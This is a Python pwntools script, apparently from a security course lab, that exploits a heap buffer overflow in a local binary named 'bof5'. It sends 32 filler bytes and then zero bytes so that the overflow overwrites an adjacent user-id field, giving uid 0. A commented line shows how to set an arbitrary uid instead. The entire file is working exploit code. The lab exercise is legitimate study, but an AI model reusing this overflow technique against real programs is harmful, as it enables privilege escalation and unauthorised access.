#!/usr/bin/env python3
from pwn import *
import shutil, os, sys

path = '/home/kali/Desktop/svt/Lab03/lab03_material/bof'
BINARY = os.path.join(path, 'bof5')

def make_payload():
    offset = 32         #offset in heap between start of pwd and start of udi
    filler = b'A' * offset
    len_uid = 4         #length for uid allocated in the heap by malloc is 8 bytes but 4 are used because it's an int

    payload = filler + (0x00).to_bytes(1, 'little') * len_uid
    #proof to test that it works if i want an arbitrary user id
    #payload = b'A'*32 + (0x0000000A).to_bytes(4, 'little')

    return payload

def main():
    io = process(BINARY)
    # launch via stdbuf so stdout is line-buffered even though it's a pipe
    #io = process([STDBUF, '-oL', BINARY])
    #io = gdb.debug(BINARY)

    io.recvuntil(b'enter password: ', timeout=1)
    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    print("payload: " + str(payload))
    io.sendline(payload)

    # read remainder of program output
    out = io.recvall(timeout=1)
    print(out.decode())

if __name__ == '__main__':
    main()

